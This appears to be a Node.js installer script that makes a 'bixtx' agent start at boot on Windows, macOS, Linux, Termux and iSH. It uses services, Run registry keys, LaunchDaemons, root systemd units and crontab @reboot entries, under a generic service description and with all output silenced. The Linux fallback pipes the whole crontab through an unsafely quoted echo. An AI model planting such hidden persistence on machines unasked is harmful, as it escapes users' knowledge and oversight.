/**
 * Persistence Installer
 * Installs the agent as a system service/daemon on all platforms.
 * Run once as Administrator/root during initial deployment.
 */

const { execSync, exec } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");

const AGENT_PATH = path.resolve(__dirname, "../../src/index.js");
const NODE_BIN = process.execPath;
const SERVICE_NAME = "bixtx.comAgent";
const DISPLAY_NAME = "bixtx.com System Service";
const DESCRIPTION = "System monitoring and endpoint management service.";

async function install() {
  const platform = process.env.BIXTX_PLATFORM_OVERRIDE || os.platform();
  console.log(`[*] Installing bixtx Agent service on ${platform}...`);

  switch (platform) {
    case "win32":
      return installWindows();
    case "darwin":
      return installMacOS();
    case "linux":
      return installLinux();
    case "android":
      return installAndroid();
    case "ios":
      return installIOS();
    case "harmony":
      return installHarmony();
    default:
      console.warn(`[!] Unknown platform "${platform}" — attempting Linux-style install as fallback`);
      return installLinux();
  }
}

function installWindows() {
  // Create Windows Service using sc.exe + NSSM (Non-Sucking Service Manager)
  const nssmPath = path.join(__dirname, "../../bin/nssm.exe");
  const startupCmd = `"${NODE_BIN}" "${AGENT_PATH}"`;

  try {
    if (fs.existsSync(nssmPath)) {
      execSync(`"${nssmPath}" install ${SERVICE_NAME} "${NODE_BIN}" "${AGENT_PATH}"`, { stdio: "ignore" });
      execSync(`"${nssmPath}" set ${SERVICE_NAME} DisplayName "${DISPLAY_NAME}"`, { stdio: "ignore" });
      execSync(`"${nssmPath}" set ${SERVICE_NAME} Description "${DESCRIPTION}"`, { stdio: "ignore" });
      execSync(`"${nssmPath}" set ${SERVICE_NAME} Start SERVICE_AUTO_START`, { stdio: "ignore" });
      execSync(`"${nssmPath}" start ${SERVICE_NAME}`, { stdio: "ignore" });
    } else {
      // Fallback: Registry AutoRun
      const regKey = `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`;
      execSync(`reg add "${regKey}" /v "${SERVICE_NAME}" /t REG_SZ /d "${startupCmd}" /f`, { stdio: "ignore" });
    }
    console.log(`[✓] Windows service installed: ${SERVICE_NAME}`);
  } catch (err) {
    console.error(`[!] Windows install failed: ${err.message}`);
    process.exit(1);
  }
}

function installMacOS() {
  const plistPath = `/Library/LaunchDaemons/ai.bixtx.agent.plist`;
  const plist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>ai.bixtx.agent</string>
  <key>ProgramArguments</key>
  <array>
    <string>${NODE_BIN}</string>
    <string>${AGENT_PATH}</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>StandardOutPath</key><string>/dev/null</string>
  <key>StandardErrorPath</key><string>/dev/null</string>
</dict>
</plist>`;

  try {
    fs.writeFileSync(plistPath, plist);
    execSync(`launchctl load -w ${plistPath}`, { stdio: "ignore" });
    console.log(`[✓] macOS LaunchDaemon installed: ai.bixtx.agent`);
  } catch (err) {
    // Fallback to user LaunchAgent
    const userPlist = `${os.homedir()}/Library/LaunchAgents/ai.bixtx.agent.plist`;
    fs.writeFileSync(userPlist, plist);
    execSync(`launchctl load -w ${userPlist}`, { stdio: "ignore" });
    console.log(`[✓] macOS LaunchAgent installed (user scope)`);
  }
}

function installLinux() {
  const unitPath = `/etc/systemd/system/bixtx-agent.service`;
  const unit = `[Unit]
Description=${DESCRIPTION}
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=5
ExecStart=${NODE_BIN} ${AGENT_PATH}
StandardOutput=null
StandardError=null
User=root

[Install]
WantedBy=multi-user.target
`;

  try {
    fs.writeFileSync(unitPath, unit);
    execSync("systemctl daemon-reload", { stdio: "ignore" });
    execSync("systemctl enable --now bixtx-agent", { stdio: "ignore" });
    console.log(`[✓] systemd service installed: bixtx-agent`);
  } catch (err) {
    // Fallback: crontab @reboot
    const cronLine = `@reboot ${NODE_BIN} ${AGENT_PATH} > /dev/null 2>&1 &`;
    const existing = (() => { try { return execSync("crontab -l", { encoding: "utf8" }); } catch { return ""; } })();
    if (!existing.includes(AGENT_PATH)) {
      const updated = existing + `\n${cronLine}\n`;
      execSync(`echo "${updated}" | crontab -`);
    }
    console.log(`[✓] crontab @reboot entry added (systemd fallback)`);
  }
}

function installAndroid() {
  // Termux: use crontab @reboot (requires Termux:Boot or crond)
  try {
    const { execSync } = require("child_process");
    const cronLine = `@reboot ${NODE_BIN} ${AGENT_PATH} > /dev/null 2>&1 &`;
    const existing = (() => { try { return execSync("crontab -l", { encoding: "utf8" }); } catch { return ""; } })();
    if (!existing.includes(AGENT_PATH)) {
      const updated = existing + `\n${cronLine}\n`;
      execSync(`printf '%s' "${updated}" | crontab -`);
    }
    console.log("[✓] Android (Termux) @reboot crontab entry added");
  } catch (err) {
    // Non-fatal: Termux crond may not be running
    console.warn(`[!] Android install partial: ${err.message}`);
  }
}

function installIOS() {
  // iSH: use crontab @reboot (Alpine cron inside iSH)
  try {
    const { execSync } = require("child_process");
    const cronLine = `@reboot ${NODE_BIN} ${AGENT_PATH} > /dev/null 2>&1 &`;
    const existing = (() => { try { return execSync("crontab -l", { encoding: "utf8" }); } catch { return ""; } })();
    if (!existing.includes(AGENT_PATH)) {
      const updated = existing + `\n${cronLine}\n`;
      execSync(`printf '%s' "${updated}" | crontab -`);
    }
    console.log("[✓] iOS (iSH) @reboot crontab entry added");
  } catch (err) {
    console.warn(`[!] iOS install partial: ${err.message}`);
  }
}

function installHarmony() {
  // HarmonyOS: no supported auto-start mechanism via Node — log guidance only
  console.log("[!] HarmonyOS: automatic persistence is not supported.");
  console.log("    Manually add this to your startup script:");
  console.log(`    ${NODE_BIN} ${AGENT_PATH} &`);
}

install().catch(err => {
  console.error("[!] Install failed:", err.message);
  process.exit(1);
});
